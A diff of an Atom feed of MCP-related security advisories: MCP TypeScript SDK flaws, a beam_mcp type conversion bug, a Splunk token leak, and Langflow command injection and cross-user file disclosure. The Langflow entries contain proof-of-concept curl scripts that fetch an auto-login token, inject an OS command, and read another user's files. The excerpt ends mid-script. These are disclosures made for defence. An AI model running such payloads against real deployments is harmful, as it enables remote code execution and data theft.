+&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;In affected versions, the experimental tasks feature (`taskStore`) did not check which session created a task. Clients sharing one `InMemoryTaskStore` could list, read and cancel each other's tasks.
+
+Experimental tasks are deprecated. The 2026-07-28 specification replaced them with a redesigned extension. The best course of action is to stop using them.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-22jm-h49p-29qw"&gt;https://github.com/advisories/GHSA-22jm-h49p-29qw&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/727075b5bbeb77fbea22041b36b72a73042160fa"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/727075b5bbeb77fbea22041b36b72a73042160fa&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/pull/2925"&gt;https://github.com/modelcontextprotocol/typescript-sdk/pull/2925&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-22jm-h49p-29qw"&gt;https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-22jm-h49p-29qw&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <id>urn:mcp:vulnerability:CVE-2026-111768</id>
+    <title>[HIGH] CVE-2026-111768: MCP TypeScript SDK: One HTTP request within the default size limit could exhaust server memory during validation</title>
+    <link rel="alternate" href="https://github.com/advisories/GHSA-46jr-4wx8-v453" />
+    <updated>2026-10-20T00:00:00Z</updated>
+    <published>2026-10-20T00:00:00Z</published>
+    <summary>MCP TypeScript SDK: One HTTP request within the default size limit could exhaust server memory during validation</summary>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-111768&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; HIGH (CVSS 7.5)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; @modelcontextprotocol/sdk&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;In affected versions, servers put no limit on how many array elements and object keys they validated in one request. One HTTP request within the default 4 MiB size limit could exhaust the server's memory, and the process aborted with `JavaScript heap out of memory`.
+
+No credentials are needed, unless you authenticate requests before they reach the SDK.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-46jr-4wx8-v453"&gt;https://github.com/advisories/GHSA-46jr-4wx8-v453&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/6d8dbc6cb590edf766fcb66b636ca6b654e99c37"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/6d8dbc6cb590edf766fcb66b636ca6b654e99c37&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/fd26801b3b387742fe24a90ed4b275dd6072209f"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/fd26801b3b387742fe24a90ed4b275dd6072209f&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/pull/2926"&gt;https://github.com/modelcontextprotocol/typescript-sdk/pull/2926&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <id>urn:mcp:vulnerability:CVE-2026-111769</id>
+    <title>[MEDIUM] CVE-2026-111769: MCP TypeScript client SDK: HTTP client transports and OAuth requests followed cross-origin redirects and re-sent custom headers and request bodies</title>
+    <link rel="alternate" href="https://github.com/advisories/GHSA-6prh-2h8m-c8cw" />
+    <updated>2026-11-03T00:00:00Z</updated>
+    <published>2026-10-20T00:00:00Z</published>
+    <summary>MCP TypeScript client SDK: HTTP client transports and OAuth requests followed cross-origin redirects and re-sent custom headers and request bodies</summary>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-111769&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; MEDIUM (CVSS 6.5)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; @modelcontextprotocol/sdk&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;In affected versions, the SDK's HTTP client transports and OAuth requests followed redirects to any origin.
+
+If an MCP server or authorization server redirected a request to another origin, that origin received custom request headers (such as an `X-API-Key` set in `requestInit.headers`) and the `mcp-session-id` header. On a `307` or `308` it also received the request body, including OAuth token requests with their `refresh_token` and `client_secret`.
+
+On current runtimes `fetch` already drops the `Authorization` header across origins.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-6prh-2h8m-c8cw"&gt;https://github.com/advisories/GHSA-6prh-2h8m-c8cw&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/30bfe5139f4b0825c90cd725f9a7e3f9af5e120d"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/30bfe5139f4b0825c90cd725f9a7e3f9af5e120d&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/433eb413dc305ebeb93b8ebcde0095a8fc0d5fa0"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/433eb413dc305ebeb93b8ebcde0095a8fc0d5fa0&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/pull/2901"&gt;https://github.com/modelcontextprotocol/typescript-sdk/pull/2901&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <id>urn:mcp:vulnerability:CVE-2026-111770</id>
+    <title>[HIGH] CVE-2026-111770: MCP  TypeScript server SDK: Shared transport or server instances delivered one HTTP client's messages to another</title>
+    <link rel="alternate" href="https://github.com/advisories/GHSA-jm63-cq47-j5jp" />
+    <updated>2026-10-20T00:00:00Z</updated>
+    <published>2026-10-20T00:00:00Z</published>
+    <summary>MCP  TypeScript server SDK: Shared transport or server instances delivered one HTTP client's messages to another</summary>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-111770&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; HIGH (CVSS 7.7)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; @modelcontextprotocol/server&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;In affected versions, an MCP server reached over HTTP could deliver one client's responses and notifications to another client. This happened when clients shared one stateless transport, or one `McpServer` or `Server` instance.
+
+Messages were matched to a connection by JSON-RPC `id` alone. SDK clients number requests from 0, so ids collide in normal use.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-jm63-cq47-j5jp"&gt;https://github.com/advisories/GHSA-jm63-cq47-j5jp&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/84804c22e45a662675a198f853b7f00063838a8d"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/84804c22e45a662675a198f853b7f00063838a8d&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/pull/2918"&gt;https://github.com/modelcontextprotocol/typescript-sdk/pull/2918&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-jm63-cq47-j5jp"&gt;https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-jm63-cq47-j5jp&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <id>urn:mcp:vulnerability:CVE-2026-111771</id>
+    <title>[MEDIUM] CVE-2026-111771: MCP TypeScript SDK: Server bearer authentication accepted tokens issued for another service</title>
+    <link rel="alternate" href="https://github.com/advisories/GHSA-rvq5-wwqv-78pq" />
+    <updated>2026-10-20T00:00:00Z</updated>
+    <published>2026-10-20T00:00:00Z</published>
+    <summary>MCP TypeScript SDK: Server bearer authentication accepted tokens issued for another service</summary>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-111771&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; MEDIUM (CVSS 6.8)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; @modelcontextprotocol/server-legacy&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;In affected versions, the SDK's server-side bearer authentication had no way to check that a token was issued for your server (its audience). Where one authorization server issues tokens for several services, a valid token for another service was also accepted by your MCP server.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-rvq5-wwqv-78pq"&gt;https://github.com/advisories/GHSA-rvq5-wwqv-78pq&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/40f8f4e229d963cd7fd2890bda2aeebe7005299a"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/40f8f4e229d963cd7fd2890bda2aeebe7005299a&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/5a0724d14cf34a27a3b070224d2996cdd611df9f"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/5a0724d14cf34a27a3b070224d2996cdd611df9f&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/5a1867390b91b8836f49af76c45427279f513325"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/5a1867390b91b8836f49af76c45427279f513325&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
@@ -1759,719 +1873,6 @@ This issue affects beam_mcp: from 0.1.0 before 0.10.1.&lt;/p&gt;
 &lt;li&gt;&lt;a href="https://github.com/ScriptKittyOS/beam_mcp/commit/083838eb8e17fe5f6fcaf761bdbe203110288b0b"&gt;https://github.com/ScriptKittyOS/beam_mcp/commit/083838eb8e17fe5f6fcaf761bdbe203110288b0b&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://github.com/ScriptKittyOS/beam_mcp/commit/289dbdbad641943b29a3b8d1eb36506cc8cec10a"&gt;https://github.com/ScriptKittyOS/beam_mcp/commit/289dbdbad641943b29a3b8d1eb36506cc8cec10a&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://github.com/ScriptKittyOS/beam_mcp/security/advisories/GHSA-mrg2-4747-fmpw"&gt;https://github.com/ScriptKittyOS/beam_mcp/security/advisories/GHSA-mrg2-4747-fmpw&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <id>urn:mcp:vulnerability:CVE-2026-104634</id>
-    <title>[MEDIUM] CVE-2026-104634: Incorrect Type Conversion or Cast vulnerability in BeamMCP.Server in ScriptKittyOS beam_mcp allows an MCP client's JSON </title>
-    <link rel="alternate" href="https://github.com/ScriptKittyOS/beam_mcp/commit/083838eb8e17fe5f6fcaf761bdbe203110288b0b" />
-    <updated>2026-10-08T21:01:07.830Z</updated>
-    <published>2026-10-08T14:16:46.370Z</published>
-    <summary>Incorrect Type Conversion or Cast vulnerability in BeamMCP.Server in ScriptKittyOS beam_mcp allows an MCP client's JSON </summary>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-104634&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; MEDIUM&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; beam_mcp, scriptkittyos/beam_mcp&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;Incorrect Type Conversion or Cast vulnerability in BeamMCP.Server in ScriptKittyOS beam_mcp allows an MCP client's JSON true, false and null tool arguments to reach the host's dispatch function as the strings "true", "false" and "nil". After BeamMCP.Schema.validate/2 accepted a value as a boolean, normalize_arguments/2 passed every argument through to_json_value/1, whose atom clause converts true, false and nil to strings. A string is truthy in Elixir, so a host that tests a boolean argument, for example if args.dry_run, takes the opposite branch for false, and a guard such as confirm: false reads as set.
-
-The client controls the argument and could send true directly, so the practical impact is limited to hosts whose behaviour on false differs from their behaviour on true, and to any policy layer in front of the server that permits false but refuses true. The same normalisation applies to prompts/get arguments, which exist from 0.5.0.
-
-This issue affects beam_mcp: from 0.1.0 before 0.10.1.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://cna.erlef.org/cves/CVE-2026-104634.html"&gt;https://cna.erlef.org/cves/CVE-2026-104634.html&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/ScriptKittyOS/beam_mcp/commit/083838eb8e17fe5f6fcaf761bdbe203110288b0b"&gt;https://github.com/ScriptKittyOS/beam_mcp/commit/083838eb8e17fe5f6fcaf761bdbe203110288b0b&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/ScriptKittyOS/beam_mcp/commit/289dbdbad641943b29a3b8d1eb36506cc8cec10a"&gt;https://github.com/ScriptKittyOS/beam_mcp/commit/289dbdbad641943b29a3b8d1eb36506cc8cec10a&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/ScriptKittyOS/beam_mcp/security/advisories/GHSA-wv7p-j6qh-3hj4"&gt;https://github.com/ScriptKittyOS/beam_mcp/security/advisories/GHSA-wv7p-j6qh-3hj4&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <id>urn:mcp:vulnerability:CVE-2026-76286</id>
-    <title>[MEDIUM] CVE-2026-76286: In Splunk MCP Server versions below 1.2.1, Splunk MCP Server could send the Splunk platform authentication token of a us</title>
-    <link rel="alternate" href="https://github.com/JMartynov/mcp-vulnerabilities/blob/main/data/vulnerabilities/CVE-2026-76286.json" />
-    <updated>2026-10-08T20:08:45.857Z</updated>
-    <published>2026-10-07T21:17:20.387Z</published>
-    <summary>In Splunk MCP Server versions below 1.2.1, Splunk MCP Server could send the Splunk platform authentication token of a us</summary>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-76286&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; MEDIUM (CVSS 5.3)&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; unknown&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;In Splunk MCP Server versions below 1.2.1, Splunk MCP Server could send the Splunk platform authentication token of a user who runs a custom Application Programming Interface (API) tool to the URL configured for that tool. If another user controls that URL, they could capture the token and use it to access data and perform actions as the user who ran the tool. Successful exploitation requires a user who holds a role that contains the mcp_tool_execute capability to run a custom API tool configured by another user. For more information see Configure the Splunk MCP Server (https://help.splunk.com/en/splunk-enterprise/mcp-server-for-splunk-platform/1.2/configure-the-splunk-mcp-server) and Managing custom tools in Splunk MCP Server (https://help.splunk.com/en/splunk-enterprise/mcp-server-for-splunk-platform/1.2/managing-custom-tools-in-splunk-mcp-server) in the Splunk documentation.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://advisory.splunk.com/advisories/SVD-2026-1004"&gt;https://advisory.splunk.com/advisories/SVD-2026-1004&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <id>urn:mcp:vulnerability:GHSA-w794-rj3p-xv45</id>
-    <title>[CRITICAL] GHSA-w794-rj3p-xv45: Langflow: OS command injection (RCE) via arbitrary command in MCP stdio server configuration</title>
-    <link rel="alternate" href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-w794-rj3p-xv45" />
-    <updated>2026-10-07T20:36:36Z</updated>
-    <published>2026-10-07T20:36:35Z</published>
-    <summary>Langflow: OS command injection (RCE) via arbitrary command in MCP stdio server configuration</summary>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; GHSA-w794-rj3p-xv45&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; CRITICAL (CVSS 9.9)&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; langflow, langflow-base, lfx&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;### Summary
-
-Before **Langflow 1.10.3**, the MCP stdio transport launched whatever `command` / `args` a user put in an MCP server configuration, with no allowlist and (before 1.10.3) wrapped in `bash -c "exec {command} ..."`. Any user able to reach the MCP server settings ("Settings → MCP Servers → Add MCP Server", `POST/PATCH /api/v2/mcp/servers/{server_name}`) or to build a flow with the MCP Tools component could add a "server" whose command is an arbitrary OS command (`touch`, `rm -rf`, a reverse shell, ...). The command runs on the Langflow host as the Langflow process user as soon as Langflow tries to connect to the server (listing servers, loading tools, running the flow) — even when the UI then reports that the stdio server failed to start.
-
-With the default `LANGFLOW_AUTO_LOGIN=true`, `GET /api/v1/auto_login` hands out a token without credentials, so on an exposed instance running the default configuration this is reachable without an account. `AUTO_LOGIN` is documented as a development-only setting; with it disabled, any authenticated (non-admin) user can exploit it.
-
-The issue was fixed in two steps and is **fully fixed in Langflow 1.10.3** (and 1.11.0+):
-
-- **1.9.0** — #12290 added a command allowlist and argument/env validation to the REST model (`MCPServerConfig`), blocking the "Add MCP Server" vector reported here.
-- **1.10.3** — #14036 applied the same policy at the execution sink (`lfx.base.mcp.util`), including configs embedded in flows / tweaks and the final pre-spawn boundary, and removed the `bash -c` wrapper (the process is now exec'd directly, without a shell).
-
-### Affected versions
-
-| Package (PyPI) | Vulnerable | Patched |
-|---|---|---|
-| `langflow` | `&gt;= 1.1.2, &lt; 1.10.3` | `1.10.3` |
-| `langflow-base` | `&gt;= 0.1.2, &lt; 0.10.3` | `0.10.3` |
-| `lfx` | `&lt; 1.10.3` | `1.10.3` |
-
-| Release | State |
-|---|---|
-| `1.1.2` – `1.4.x` | MCP Stdio component (added in #5148) runs `StdioServerParameters(command=..., args=...)` from the component's `command` field with no validation. |
-| `1.5.0` – `1.8.x` | "Add MCP Server" settings page and `/api/v2/mcp/servers` API added (#8388). Stored stdio configs are launched via `bash -c "exec {command_str} ..."` with no validation. The PoC below works as-is. |
-| `1.9.0` – `1.10.2` | #12290: `POST`/`PATCH /api/v2/mcp/servers` reject commands outside the allowlist. The execution sink still has no validation and still uses `bash -c`, so configs that do not go through `MCPServerConfig` (for example an MCP Tools component value embedded in a flow or passed as a tweak) can still execute arbitrary commands. |
-| `1.10.3`+ | #14036: one shared policy (`lfx.base.mcp.security.validate_mcp_stdio_config`) is enforced at the API, at flow execution and right before the process is spawned; no shell is used. **Fixed.** |
-
-### Details
-
-Vulnerable sink (`src/lfx/src/lfx/base/mcp/util.py`, `MCPStdioClient._connect_to_server`, before 1.10.3):
-
-```python
-server_params = StdioServerParameters(
-    command="bash",
-    args=["-c", f"exec {command_str} || echo 'Command failed with exit code $?' &gt;&amp;2"],
-    env=env_data,
-)
-```
-
-`command_str` is built from the user's `command` + `args`. The only "validation" before 1.9.0 was `_validate_node_installation`, which only checks that Node.js is installed when the command contains `npx`. The MCP SDK then starts the process with `anyio.open_process`, so the command runs before any MCP handshake — which is why it executes even if the UI shows "failed to start".
-
-### PoC (as reported, Langflow 1.5.0 – 1.8.x)
-
-In "Add MCP Server" → STDIO, add:
-
-```
-Name      - Test
-Command   - touch
-Arguments - /tmp/pwn
-```
-
-Or through the API, using a token from `auto_login` (default configuration):
-
-```bash
-TOKEN=$(curl -s http://127.0.0.1:7860/api/v1/auto_login | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
-
-curl -s -X POST 'http://127.0.0.1:7860/api/v2/mcp/servers/testing' \
-  -H "Authorization: Bearer $TOKEN" \
-  -H 'Content-Type: application/json' \
-  --data-raw '{"command":"touch","args":["/tmp/pwned_langflow"]}'
-```
-
-`/tmp/pwned_langflow` gets created on the server. On 1.10.3+ the request is rejected with `Command 'touch' is not allowed for security reasons. Allowed commands: bash, cmd, docker, node, npx, python, python3, uvx`, and the same payload fails at the sink (`MCPStdioClient.connect_to_server("touch /tmp/pwned_langflow")` raises `MCPStdioSecurityError`, and no file is created). Wrappers such as `bash -c "touch ..."`, `sh -c ...`, `python3 -c ...` and `node -e ...` are also rejected.
-
-### Fix
-
-- **#12290** (1.9.0) — `MCPServerConfig` validators: command allowlist (`node`, `python`, `python3`, `npx`, `uvx`, `docker`, and `cmd`/`sh`/`bash` only to wrap one of those), shell-metacharacter and dangerous-keyword checks on arguments, env var blocklist (`LD_PRELOAD`, `NODE_OPTIONS`, `PYTHONPATH`, `BASH_ENV`, ...), and Docker isolation checks.
-- **#14036** (1.10.3) — moves the policy into `lfx.base.mcp.security.validate_mcp_stdio_config` and enforces it at every entry point (API, embedded flow / tweak configs, the deprecated MCP Stdio component and just before spawn); it also launches the process without a shell:
-
-```python
-command_parts = shlex.split(command_str)
-command, args = command_parts[0], command_parts[1:]
-validate_mcp_stdio_config(command, args, env)   # final pre-spawn enforcement
-server_params = StdioServerParameters(command=command, args=final_args, env=env_data)
-```
-
-Later hardening (1.11.0, #13530) adds optional stricter modes for multi-tenant deployments.
-
-### Workarounds (if you cannot upgrade)
-
-- Set `LANGFLOW_AUTO_LOGIN=false` and do not expose Langflow directly to untrusted networks.
-- Only give Langflow accounts to trusted users.
-
-### Hardening recommendations for 1.10.3+
-
-The allowlist still lets `npx` / `uvx` run any package by default, which is how MCP servers are normally distributed. On multi-tenant deployments, operators should also set:
-
-- `LANGFLOW_MCP_SERVER_ALLOWED_PACKAGES` — the exact packages `npx` / `uvx` may run.
-- `LANGFLOW_MCP_SERVER_INTERPRETER_HARDENING=true` and `LANGFLOW_MCP_SERVER_DOCKER_HARDENING=true`.
-- On 1.11.1+ (#14150), restricting custom code (`LANGFLOW_ALLOW_CUSTOM_COMPONENTS=false`, `LANGFLOW_CUSTOM_COMPONENT_ADMIN_ONLY=true` or `LANGFLOW_BLOCK_CODE_INTERPRETER_COMPONENTS=true`) also limits MCP stdio servers to superusers.
-
-### Impact
-
-Remote code execution on the Langflow host as the Langflow process user (CWE-78). Any exposed instance on a vulnerable version is affected, whether the attacker has an account or uses the default `AUTO_LOGIN`. The reporter found several internet-facing Langflow servers that were vulnerable.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-w794-rj3p-xv45"&gt;https://github.com/langflow-ai/langflow/security/advisories/GHSA-w794-rj3p-xv45&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-105697"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-105697&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/langflow-ai/langflow/pull/12290"&gt;https://github.com/langflow-ai/langflow/pull/12290&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/langflow-ai/langflow/pull/14036"&gt;https://github.com/langflow-ai/langflow/pull/14036&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <id>urn:mcp:vulnerability:CVE-2026-105699</id>
-    <title>[UNKNOWN] CVE-2026-105699: Langflow has Authenticated Cross-Project File Disclosure via Unscoped MCP Resource Handlers</title>
-    <link rel="alternate" href="https://github.com/advisories/GHSA-4hmc-cfm3-w43c" />
-    <updated>2026-10-07T20:35:13Z</updated>
-    <published>2026-10-07T20:35:12Z</published>
-    <summary>Langflow has Authenticated Cross-Project File Disclosure via Unscoped MCP Resource Handlers</summary>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-105699&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; UNKNOWN&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; langflow&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;### Summary
-Langflow's project-scoped MCP transport authenticates the caller for the `project_id` in the connection URL, but the subsequent `resources/read` operation does not authorize the resource URI being requested. An authenticated user can connect to their own project-scoped MCP endpoint and supply a crafted file-download URI that points to another user's flow-backed file. The server then reads and returns the victim file without verifying ownership or project membership.
-
-This is a cross-user authorization bypass (`userA -&gt; userB`) that allows arbitrary read access to files stored under other users' flow namespaces.
-
-### Details
-Verified against local checkout:
-
-- Repository: `langflow-ai/langflow`
-- Verified on release tag: `v1.8.3`
-- Commit: `08bf98404cfd7737fde57a2588785766cdf1b42e`
-- Earliest stable release known to contain the vulnerable code path: `v1.6.8`
-
-Relevant code path:
-
-1. `src/backend/base/langflow/api/v1/mcp_projects.py:147-193`
-   `verify_project_auth_conditional()` authenticates the caller and checks access only to the `project_id` in the MCP transport URL.
-
-2. `src/backend/base/langflow/api/v1/mcp_projects.py:1238-1241`
-   The project-scoped MCP server registers `read_resource()` and forwards the attacker-controlled URI directly to `handle_read_resource(uri=uri)`.
-
-3. `src/backend/base/langflow/api/v1/mcp_utils.py:163-182`
-   `handle_read_resource()` parses the last two URI path segments as `flow_id` and `filename`, then directly calls:
-
-   ```python
-   storage_service.get_file(flow_id=flow_id, file_name=filename)
-   ```
-
-   No check ties the supplied `flow_id` back to the authenticated user or the current project.
-
-4. `src/backend/base/langflow/services/storage/local.py:141-149`
-   `src/backend/base/langflow/services/storage/s3.py:200-217`
-   The storage layer performs a raw namespace read and is not authorization-aware.
-
-The result is that authorization is enforced at MCP connection time, but not at resource-read time. Once an attacker has access to any project-scoped MCP endpoint they own, they can read another user's flow-backed file by passing a victim-controlled URI.
-
-This issue is also easier to exploit because the global MCP helpers expose cross-user discovery data:
-
-- `src/backend/base/langflow/api/v1/mcp_utils.py:102-121`
-  `handle_list_resources(project_id=None)` lists files for all flows.
-- `src/backend/base/langflow/api/v1/mcp_utils.py:333-380`
-  `handle_list_tools(project_id=None)` queries all flows and includes flow IDs in tool metadata.
-
-That global enumeration is not required for exploitation, but it makes obtaining victim identifiers much easier.
-
-### PoC
-Preconditions:
-
-- Langflow is running locally with authentication enabled.
-- Two separate users exist on the same instance.
-- The victim has a flow with an uploaded file.
-- The attacker has access to any project they own.
-
-Verify the issue locally by starting Langflow with:
-
-```bash
-cd '/Users/r1zzg0d/Documents/CVE hunting/targets/langflow'
-
-set -a
-source .env.verify
-set +a
-
-export LANGFLOW_CONFIG_DIR="$PWD/.langflow-verify"
-
-uv run python - &lt;&lt;'PY'
-from langflow.main import setup_app
-import uvicorn
-
-app = setup_app(backend_only=True)
-uvicorn.run(app, host="127.0.0.1", port=7860, log_level="debug")
-PY
-```
-
-Then, in a second terminal, the following script creates a victim user, an attacker user, a victim flow-backed file, and demonstrates that:
-
-- the normal file download route is blocked for the attacker (`404`)
-- the same file is readable through the attacker's own project-scoped MCP connection
-
-```bash
-cd '/Users/r1zzg0d/Documents/CVE hunting/targets/langflow'
-set -euo pipefail
-
-export BASE='http://127.0.0.1:7860'
-export PASS='Passw0rd!Passw0rd!'
-export VICTIM_USER="victim.$RANDOM@example.com"
-export ATTACKER_USER="attacker.$RANDOM@example.com"
-
-curl -sS -X POST "$BASE/api/v1/users/" \
-  -H 'Content-Type: application/json' \
-  -d "{\"username\":\"$VICTIM_USER\",\"password\":\"$PASS\"}" &gt;/dev/null
-
-curl -sS -X POST "$BASE/api/v1/users/" \
-  -H 'Content-Type: application/json' \
-  -d "{\"username\":\"$ATTACKER_USER\",\"password\":\"$PASS\"}" &gt;/dev/null
-
-export VICTIM_TOKEN=$(
-  curl -sS -X POST "$BASE/api/v1/login" \
-    -H 'Content-Type: application/x-www-form-urlencoded' \
-    --data-urlencode "username=$VICTIM_USER" \
-    --data-urlencode "password=$PASS" | jq -r '.access_token'
-)
-
-export ATTACKER_TOKEN=$(
-  curl -sS -X POST "$BASE/api/v1/login" \
-    -H 'Content-Type: application/x-www-form-urlencoded' \
